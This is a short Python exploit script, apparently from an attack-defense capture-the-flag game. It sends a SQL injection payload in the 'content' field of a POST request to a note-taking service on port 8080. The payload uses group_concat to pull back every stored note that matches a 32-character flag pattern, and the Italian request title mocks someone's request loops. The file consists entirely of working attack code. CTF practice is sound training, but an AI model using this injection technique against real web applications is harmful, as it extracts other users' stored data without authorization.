#!/usr/bin/env python3

import requests
import sys

ip = sys.argv[1]
sql = "' || (select group_concat(content) from notes where content liKe \"%=\" and length(content) = 32)) --"
res = requests.post(f"http://{ip}:8080/new", data={"title": "Barrera smetti di usare i while con 1000 richieste", "content": sql})
print(res.text, flush=True)